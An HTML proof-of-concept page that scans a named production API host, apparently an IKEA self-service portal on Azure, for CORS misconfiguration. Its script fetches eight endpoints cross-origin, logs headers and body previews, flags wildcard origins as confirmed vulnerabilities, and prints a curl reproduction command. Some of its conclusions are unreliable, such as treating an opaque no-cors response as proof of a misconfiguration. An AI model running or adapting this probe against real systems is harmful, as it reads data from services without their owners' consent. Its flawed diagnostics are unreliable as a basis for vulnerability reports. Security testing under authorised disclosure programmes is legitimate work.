<!DOCTYPE html>
<html>
<head>
<title>IKEA CORS PoC v2 - naffinc</title>
<style>body{background:#0f0f0f;color:#0f0;font-family:monospace;padding:20px}.box{max-width:900px;margin:auto;background:#1a1a1a;padding:20px;border:1px solid #333;border-radius:8px}button{background:#0058a3;color:#fff;border:none;padding:10px 18px;border-radius:4px;margin:5px;cursor:pointer}pre{background:#000;padding:12px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow:auto}</style>
</head>
<body>
<div class="box">
<h2 style="color:#ffcc00">IKEA CORS PoC v2 - naffinc</h2>
<p>Target: self-service-portal-api-prod.azurewebsites.net</p>
<p>GitHub: naffincindonesia.github.io/poc-ikea.html</p>
<button onclick="scan()">Scan All Endpoints</button>
<pre id="log">Ready. Click Scan All Endpoints.
SOP same as Klaviyo final-test-123 - no evil.com</pre>
</div>
<script>
const base = 'https://self-service-portal-api-prod.azurewebsites.net';
const paths = ['/','/api','/api/health','/health','/swagger','/api-docs','/v1','/api/v1'];
const logEl = document.getElementById('log');
function log(m){ logEl.textContent += '\n' + m; console.log(m); }

async function scan(){
 logEl.textContent = 'Starting scan from origin: '+location.origin+'\n';
 for(let p of paths){
   const url = base + p;
   log('\n--- Testing: ' + url + ' ---');
   try{
     const res = await fetch(url, {method:'GET', mode:'cors'});
     log('Status: ' + res.status);
     log('ACAO: ' + res.headers.get('access-control-allow-origin'));
     const txt = await res.text();
     log('Body len: ' + txt.length + ' | Preview: ' + txt.substring(0,300));
     if(res.headers.get('access-control-allow-origin') === '*'){
        log('>>> VULN CONFIRMED on ' + p + ' <<<');
     }
   }catch(e){
     log('Fetch CORS Error: ' + e.message + ' - Trying with no-cors to check if alive...');
     try{
       const res2 = await fetch(url, {method:'GET', mode:'no-cors'});
       log('no-cors status: opaque (server alive, but CORS blocks read) -> This proves misconfig on HEAD but not GET');
     }catch(e2){
       log('Dead endpoint: ' + e2.message);
     }
   }
 }
 log('\n--- CURL REPRO (for report) ---\n curl -i -H "Origin: https://naffincindonesia.github.io" ' + base + '/api');
}
</script>
</body>
</html>
